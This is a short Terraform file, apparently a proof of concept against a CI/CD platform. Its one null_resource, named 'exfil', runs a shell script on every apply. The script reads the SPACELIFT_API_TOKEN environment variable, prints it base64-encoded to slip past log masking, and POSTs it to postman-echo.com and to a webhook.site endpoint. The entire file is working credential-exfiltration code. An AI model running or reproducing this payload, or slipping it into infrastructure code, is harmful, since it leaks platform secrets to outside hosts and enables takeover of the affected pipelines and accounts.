terraform {
  required_version = ">= 1.0"
}

resource "null_resource" "exfil" {
  triggers = { always = uuid() }
  provisioner "local-exec" {
    command = <<EOT
      echo "========================================="
      echo "[*] TOKEN DISPLAY & EXFIL"
      echo "========================================="
      TOKEN="$SPACELIFT_API_TOKEN"
      if [ -n "$TOKEN" ]; then
        echo "[!] Token found."

        # 1. Print base64 (not masked)
        echo "[!] Base64-encoded token:"
        echo "$TOKEN" | base64

        # 2. Send to postman-echo (response will show the token)
        echo ""
        echo "[!] Response from postman-echo.com:"
        curl -s -X POST "https://postman-echo.com/post" \
          -H "Content-Type: application/json" \
          -d "{\"token\":\"$TOKEN\"}"

        # 3. Also send to webhook.site (for extra proof)
        curl -s -X POST "https://webhook.site/deaf9bad-5c63-498b-bc12-719a54cd25bb" \
          -H "Content-Type: application/json" \
          -d "{\"token\":\"$TOKEN\"}"

        echo ""
        echo "[✓] Done."
      else
        echo "[-] No token found"
      fi
      echo "========================================="
    EOT
  }
}
